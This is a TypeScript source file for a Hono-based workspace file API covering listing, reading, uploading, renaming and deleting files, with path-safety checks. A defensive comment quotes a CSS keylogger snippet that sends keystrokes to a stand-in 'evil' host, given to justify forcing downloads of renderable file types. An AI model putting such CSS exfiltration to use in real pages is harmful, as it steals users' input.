import { Hono } from 'hono';
import fs from 'node:fs/promises';
import type { Dirent } from 'node:fs';
import path from 'node:path';
import type { DbHandles } from '../db/client.js';
import { assertSafePath } from '../utils/path-safe.js';
import { contentDisposition } from '../utils/content-disposition.js';
import { HttpError } from '../utils/http-error.js';
import { isProtectedPath } from '../utils/protected-paths.js';

// Extensions whose content the browser would happily render in our origin
// (HTML, scripted SVG, CSS-based exfil, JS, XML/XHTML). Even if a malicious
// file arrives here legitimately (whitelisted user uploads then social-
// engineers themselves into navigating to the URL), forcing a download
// neutralises the in-origin phishing / CSS exfil paths. CSP `script-src
// 'self'` already blocks <script>-based XSS on those, but CSS-based
// keyloggers (`:focus { background: url(//evil/?key=) }`) and
// look-alike forms remain feasible without the download header.
const FORCE_DOWNLOAD_EXTS = new Set([
  '.html',
  '.htm',
  '.xhtml',
  '.svg',
  '.xml',
  '.js',
  '.mjs',
  '.cjs',
  '.css',
]);
import {
  CreateDirectoryInput,
  RenameInput,
  type FileEntry,
} from '@buck/shared';

export interface WorkspaceRouteDeps {
  db: DbHandles;
  workspaceDir: string;
}

function throwIfProtected(relPath: string): void {
  const dir = isProtectedPath(relPath);
  if (dir) {
    throw new HttpError(
      403,
      'protected_directory',
      `cannot write inside protected directory: ${dir}`,
    );
  }
}

async function buildTree(
  dirPath: string,
  relativeTo: string,
): Promise<FileEntry[]> {
  let entries: Dirent[];
  try {
    entries = await fs.readdir(dirPath, { withFileTypes: true });
  } catch {
    return [];
  }

  // Sort : directories first (alpha), then files (alpha). `localeCompare`
  // with `sensitivity: 'base'` keeps case-insensitive ordering.
  entries.sort((a, b) => {
    const aDir = a.isDirectory();
    const bDir = b.isDirectory();
    if (aDir !== bDir) return aDir ? -1 : 1;
    return a.name.localeCompare(b.name, undefined, { sensitivity: 'base' });
  });

  const result: FileEntry[] = [];
  for (const entry of entries) {
    // Hidden directories the user should never see from the workspace tree.
    if (entry.name === '.attachments' || entry.name === '.tts_audio') continue;

    const entryPath = path.join(dirPath, entry.name);
    const rel = path.relative(relativeTo, entryPath);

    if (entry.isDirectory()) {
      const children = await buildTree(entryPath, relativeTo);
      result.push({
        name: entry.name,
        path: rel,
        type: 'directory',
        children,
      });
    } else if (entry.isFile()) {
      const stat = await fs.stat(entryPath);
      result.push({
        name: entry.name,
        path: rel,
        type: 'file',
        size: stat.size,
      });
    }
  }
  return result;
}

export function createWorkspaceRoutes(
  deps: WorkspaceRouteDeps,
): Hono<{ Variables: { userId: string } }> {
  const app = new Hono<{ Variables: { userId: string } }>();
  const { workspaceDir } = deps;

  // GET /tree — full workspace tree
  app.get('/tree', async (c) => {
    const tree = await buildTree(workspaceDir, workspaceDir);
    return c.json({ tree });
  });

  // GET /file?path=... — read/download a file
  app.get('/file', async (c) => {
    const filePath = c.req.query('path');
    if (!filePath) {
      throw new HttpError(422, 'missing_path', 'path query parameter required');
    }

    const abs = await assertSafePath(workspaceDir, filePath);

    // Open once, fstat + read on the same descriptor → no TOCTOU race.
    let fh;
    try {
      fh = await fs.open(abs, 'r');
    } catch {
      throw new HttpError(404, 'not_found', 'file not found');
    }

    let content: Buffer;
    try {
      const stat = await fh.stat();
      if (stat.isDirectory()) {
        throw new HttpError(422, 'is_directory', 'path is a directory');
      }
      content = await fh.readFile();
    } finally {
      await fh.close();
    }
    // Derive a content-type. For extensions in FORCE_DOWNLOAD_EXTS we
    // intentionally drop the native MIME and force `attachment` (VULN-003)
    // so the browser cannot render the file in our origin.
    const ext = path.extname(abs).toLowerCase();
    const mimeMap: Record<string, string> = {
      '.txt': 'text/plain',
      '.md': 'text/markdown',
      '.json': 'application/json',
      '.ts': 'text/typescript',
      '.png': 'image/png',
      '.jpg': 'image/jpeg',
      '.jpeg': 'image/jpeg',
      '.gif': 'image/gif',
      '.webp': 'image/webp',
      '.pdf': 'application/pdf',
    };

    const headers: Record<string, string> = {};
    if (FORCE_DOWNLOAD_EXTS.has(ext)) {
      const filename = path.basename(abs);
      headers['content-type'] = 'application/octet-stream';
      headers['content-disposition'] = contentDisposition('attachment', filename);
    } else {
      headers['content-type'] = mimeMap[ext] ?? 'application/octet-stream';
    }

    return new Response(new Uint8Array(content), {
      status: 200,
      headers,
    });
  });

  // POST /file — upload a file (multipart: file + path)
  app.post('/file', async (c) => {
    const formData = await c.req.formData();
    const file = formData.get('file');
    const filePath = formData.get('path');

    if (!file || !(file instanceof File)) {
      throw new HttpError(422, 'missing_file', 'file field required');
    }
    if (!filePath || typeof filePath !== 'string') {
      throw new HttpError(422, 'missing_path', 'path field required');
    }

    throwIfProtected(filePath);
    const abs = await assertSafePath(workspaceDir, filePath);
    // Create parent dirs
    await fs.mkdir(path.dirname(abs), { recursive: true });

    const buffer = Buffer.from(await file.arrayBuffer());
    await fs.writeFile(abs, buffer);

    return c.json({ ok: true, path: filePath }, 201);
  });

  // POST /directory — create a directory
  app.post('/directory', async (c) => {
    const body = await c.req.json();
    const parsed = CreateDirectoryInput.safeParse(body);
    if (!parsed.success) {
      throw new HttpError(422, 'validation_error', parsed.error.message);
    }

    throwIfProtected(parsed.data.path);
    const abs = await assertSafePath(workspaceDir, parsed.data.path);
    await fs.mkdir(abs, { recursive: true });

    return c.json({ ok: true, path: parsed.data.path }, 201);
  });

  // PATCH /file?path=... — rename
  app.patch('/file', async (c) => {
    const filePath = c.req.query('path');
    if (!filePath) {
      throw new HttpError(422, 'missing_path', 'path query parameter required');
    }

    const body = await c.req.json();
    const parsed = RenameInput.safeParse(body);
    if (!parsed.success) {
      throw new HttpError(422, 'validation_error', parsed.error.message);
    }

    throwIfProtected(filePath);
    const absOld = await assertSafePath(workspaceDir, filePath);

    // Check old path exists
    try {
      await fs.stat(absOld);
    } catch {
      throw new HttpError(404, 'not_found', 'file not found');
    }

    // Build new path: same parent dir, new name
    const newRelative = path.join(path.dirname(filePath), parsed.data.newName);
    throwIfProtected(newRelative);
    const absNew = await assertSafePath(workspaceDir, newRelative);

    await fs.rename(absOld, absNew);

    return c.json({ ok: true, path: newRelative });
  });

  // DELETE /file?path=... — delete file or directory
  app.delete('/file', async (c) => {
    const filePath = c.req.query('path');
    if (!filePath) {
      throw new HttpError(422, 'missing_path', 'path query parameter required');
    }

    throwIfProtected(filePath);
    const abs = await assertSafePath(workspaceDir, filePath);

    // Check exists
    try {
      await fs.stat(abs);
    } catch {
      throw new HttpError(404, 'not_found', 'file not found');
    }

    await fs.rm(abs, { recursive: true });

    return c.json({ ok: true });
  });

  return app;
}
